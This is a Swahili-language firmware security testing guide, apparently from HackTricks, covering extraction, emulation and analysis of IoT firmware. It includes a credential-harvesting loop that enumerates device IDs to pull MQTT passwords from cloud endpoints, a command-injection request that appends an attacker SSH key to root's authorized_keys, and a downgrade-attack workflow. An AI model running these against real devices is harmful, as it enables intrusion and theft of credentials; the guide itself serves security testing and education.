# Uchanganuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware ni programu muhimu inayoruhusu vifaa kufanya kazi ipasavyo kwa kusimamia na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambavyo watumiaji wanavyoshirikiana navyo. Imehifadhiwa kwenye kumbukumbu ya kudumu, ikihakikisha kifaa kinaweza kupata maagizo muhimu tangu kinapowashwa, jambo linalosababisha uzinduzi wa operating system. Kuchunguza na pengine kubadilisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.

## **Kukusanya Habari**

**Kukusanya habari** ni hatua ya mwanzo muhimu katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha ukusanyaji wa data kuhusu:

- Msanifu wa CPU na sistema ya uendeshaji inayokimbia
- Maelezo ya bootloader
- Mpangilio wa hardware na datasheets
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Historia za updates na vyeti vya udhibiti
- Mchoro wa usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni za thamani sana, kama vile uchambuzi wa vipengele vyovyote vya software za chanzo wazi kupitia mchakato wa ukaguzi kwa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure ambayo inaweza kutumika kugundua masuala yanayoweza kujitokeza.

## **Kupata Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na ngazi yake ya ugumu:

- **Moja kwa moja** kutoka chanzo (waendelezaji, watengenezaji)
- **Kujenga** kutoka kwa maelekezo yaliyotolewa
- **Kupakua** kutoka kwa tovuti rasmi za msaada
- Kutumia maswali ya **Google dork** kutafuta faili za firmware zilizohost
- Kupata **hifadhi ya wingu** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukatiza **updates** kwa kutumia mbinu za man-in-the-middle
- **Kuchukua** kutoka kwenye kifaa kupitia muunganisho kama **UART**, **JTAG**, au **PICit**
- **Sniffing** kwa ajili ya maombi ya update ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Dumping** kutoka bootloader au network
- **Kuondoa na kusoma** chip ya storage, pale ambapo njia nyingine zote zimeshindwa, kwa kutumia zana za vifaa vinavyofaa

## Kuchambua firmware

Sasa kwa kuwa **umepata firmware**, unahitaji kutoa taarifa kuhusu yake ili kujua jinsi ya kuichunguza. Zana mbalimbali ambazo unaweza kutumia ni:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Iwapo hautopata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa kutumia `binwalk -E <bin>`. Ikiwa entropy ni ya chini, basi si uwezekano kuwa imeencrypted. Ikiwa entropy ni ya juu, inawezekana imeencrypted (au imecompressed kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) ili kuchunguza faili.

### Kupata Filesystem

Kwa zana zilizotajwa hapo juu kama `binwalk -ev <bin>` unapaswa kuwa umeweza **extract the filesystem**.\
Binwalk kawaida huiondoa ndani ya **folder named as the filesystem type**, ambayo kawaida ni mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Uondoaji wa Filesystem kwa Mkono

Mara nyingine, binwalk haitakuwa na **the magic byte of the filesystem in its signatures**. Katika kesi hizi, tumia binwalk ili **find the offset of the filesystem and carve the compressed filesystem** kutoka kwa binary na **manually extract** the filesystem kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo ili kuchonga Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Kwa njia mbadala, amri ifuatayo inaweza pia kutumika.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (ilitumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- Kwa faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystem za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystem za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Mara firmware inapopatikana, ni muhimu kuichambua ili kuelewa muundo wake na vulnerabilities zinazowezekana. Mchakato huu unajumuisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye firmware image.

### Zana za Uchambuzi wa Awali

Seti ya amri zimetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi zinasaidia kutambua file types, kutoa strings, kuchambua binary data, na kuelewa partition na filesystem details:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Kuamua hali ya encryption ya image, **entropy** huangaliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini inaashiria ukosefu wa encryption, wakati entropy ya juu inaonyesha uwezekano wa encryption au compression.

Kwa kuchora **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa uchunguzi wa faili zinapendekezwa.

### Extracting the Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida unaweza kutoa filesystem, mara nyingi ndani ya saraka iliyopewa jina kulingana na aina ya filesystem (mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kutokana na kukosekana kwa magic bytes, uondoaji wa mkono unahitajika. Hii inahusisha kutumia `binwalk` kupata offset ya filesystem, ikifuatiwa na amri ya `dd` kuchonga kutoka filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (km., squashfs, cpio, jffs2, ubifs), amri tofauti zinatumiwa kutoa yaliyomo kwa mkono.

### Uchambuzi wa mfumo wa faili

Mara mfumo wa faili unapobadilishwa, kutafutwa kwa dosari za usalama kunaanza. Umakini unaelekezwa kwa daemoni za mtandao zisizo salama, nywila zilizowekwa ndani, API endpoints, kazi za seva za update, code isiyotengenezwa, script za kuanza, na binaries zilizokompilika kwa uchambuzi wa nje ya mtandao.

**Maeneo muhimu** na **vitu** vya kuchunguza ni pamoja na:

- **etc/shadow** and **etc/passwd** kwa nywila na akaunti za watumiaji
- Vyeti vya SSL na funguo katika **etc/ssl**
- Faili za konfigurasi na script kwa udhaifu unaowezekana
- Binaries zilizowekwa kwa uchambuzi zaidi
- Seva za wavuti za kawaida za kifaa cha IoT na binaries

Vyombo kadhaa vinasaidia kufunua taarifa nyeti na udhaifu ndani ya mfumo wa faili:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi kamili wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama kwa Binaries zilizokompilika

Zote source code na binaries zilizokompilika zilizopatikana kwenye mfumo wa faili lazima zichunguzwe kwa udhaifu. Vyombo kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kubaini binaries zisizo na ulinzi ambazo zinaweza kutumiwa.

## Kupata mipangilio ya mawingu na nywila za MQTT kupitia tokeni za URL zilizotokana

Hub nyingi za IoT hupakua konfigurasi maalumu kwa kifaa kutoka kwa endpoint ya cloud inayofanana na:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Wakati wa uchambuzi wa firmware unaweza kugundua kuwa <token> imetokana mahali hapa kwa kutumia device ID na siri iliyowekwa ndani, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu unamruhusu yeyote anayejua deviceId na STATIC_KEY kujenga tena URL na kuvuta konfigurasi ya cloud, mara nyingi ikifichua nywila za MQTT kwa plain text na prefixes za topic.

Mtiririko wa kazi wa vitendo:

1) Chota deviceId kutoka kwenye logi za boot za UART

- Unganisha adapter ya UART ya 3.3V (TX/RX/GND) na rekodi logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha cloud config URL pattern na broker address, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Rejesha STATIC_KEY na algoritimu ya token kutoka firmware

- Pakia binaries kwenye Ghidra/radare2 na tafuta config path ("/pf/") au matumizi ya MD5.
- Thibitisha algoritimu (e.g., MD5(deviceId||STATIC_KEY)).
- Pata token kwa Bash na ufanye digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kukusanya cloud config na MQTT credentials

- Tengeneza URL kisha pakua JSON kwa kutumia curl; tumia jq kuchanganua ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya MQTT ya plaintext na ACLs dhaifu za mada (ikiwa zipo)

- Tumia maelezo ya kuingia yaliyopatikana kujisajili kwa mada za matengenezo na kutafuta matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha device IDs zinazoweza kutabirika (kwa wingi, kwa idhini)

- Mifumo mingi huingiza vendor OUI/product/type bytes ikifuatiwa na kiambatisho cha mfululizo.
- Unaweza kurudia IDs zinazowezekana, kutoa tokens na kupata configs kwa njia ya programu:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Vidokezo
- Pata idhini wazi kila wakati kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kupata siri bila kubadilisha target hardware kadri inavyowezekana.

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

Kwa kuchunguza programu moja, ni muhimu kutambua endianness ya programu na CPU architecture.

#### Mfano wa MIPS Architecture

Ili emulate MIPS architecture binary, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana za kuiga zinazohitajika:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` inatumiwa, na kwa little-endian binaries, `qemu-mipsel` angekuwa chaguo.

#### Uigaji wa Architecture ya ARM

Kwa ARM binaries, mchakato ni sawa, ukitumia emulator `qemu-arm` kwa uigaji.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, husaidia uigaji kamili wa firmware, kutautomatisha mchakato na kusaidia katika uchambuzi wa dynamic.

## Dynamic Analysis in Practice

Katika hatua hii, mazingira ya kifaa halisi au yaliyoigizwa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Emulation inaweza isiigize kwa ukamilifu mwingiliano wa hardware, hivyo mara kwa mara inabidi kuanzisha emulation upya. Uchambuzi unapaswa kurudia kuchunguza filesystem, exploit webpages zilizo wazi na network services, na kuchunguza udhaifu wa bootloader. Mtihani wa integrity wa firmware ni muhimu kutambua potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis inahusisha kuingiliana na process au binary ndani ya mazingira yake ya uendeshaji, ukitumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini vulnerabilities kupitia fuzzing na mbinu nyingine.

## Binary Exploitation and Proof-of-Concept

Kuendeleza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lugha za chini. Binary runtime protections katika embedded systems ni nadra, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuwa muhimu.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira pre-configured kwa firmware security testing, yakiwa na zana muhimu.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda kwa kutoa mazingira pre-configured yenye zana zote muhimu.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata pale muuzaji anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa nje**. Wakati boot- au recovery-loader inathibitisha tu signature kwa embedded public key lakini haisi kulinganisha *version* (au monotonic counter) ya image inayoflashiwa, mshambuliaji anaweza kwa halali kutia **older, vulnerable firmware ambayo bado ina saini halali** na hivyo kure-introduce vulnerabilities zilizotengenezwa patch.

Typical attack workflow:

1. **Obtain an older signed image**
* Pakua kutoka kwenye portal ya upakuaji ya vendor, CDN au tovuti ya support.
* Toa kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Ripoti kutoka kwa third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload or serve the image to the device** kupitia channel yoyote ya update iliyo wazi:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints ambazo zinakubali Base64-encoded firmware blobs, kuzitafsiri server-side na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability ambayo ilitengenezwa patch katika release mpya (kwa mfano filter ya command-injection ambayo iliongezwa baadaye).
4. Kwa hiari, flash latest image tena au zima updates ili kuepuka detection mara persistence inapopatikana.

### Mfano: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyokuwa hatarini (iliyoshushwa kiwango), parameter ya `md5` imeunganishwa moja kwa moja ndani ya amri ya shell bila kusafishwa, ikiruhusu kuingizwa kwa amri yoyote (hapa – kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya firmware ya baadaye yaliweka kichujio rahisi cha tabia za herufi, lakini ukosefu wa ulinzi dhidi ya kushusha daraja (downgrade protection) unafanya marekebisho hayo yasiwe na tija.

### Kuchukua Firmware Kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao za kuambatana za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Paketi hizi mara nyingi huhifadhiwa bila kusimbwa ndani ya APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` rahisi zinakuwezesha kutoa images zilizosainiwa bila kugusa vifaa vya kimwili.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Orodha ya Kukagua Mantiki ya Sasisho

* Je, transport/authentication ya *update endpoint* imehifadhiwa vya kutosha (TLS + authentication)?
* Je, kifaa kinalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image imethibitishwa ndani ya secure boot chain (kwa mfano signatures checked by ROM code)?
* Je, userland code inafanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinaendelea kutumia validation logic ile ile?

> 💡  Ikiwa chochote kati ya hapo juu kinakosekana, jukwaa linaweza kuwa hatarini kwa rollback attacks.

## Firmware zilizo hatarini kwa mazoezi

Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ya firmware zifuatazo zilizo hatarini kama mwanzo.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Marejeo

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Mafunzo na Cheti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
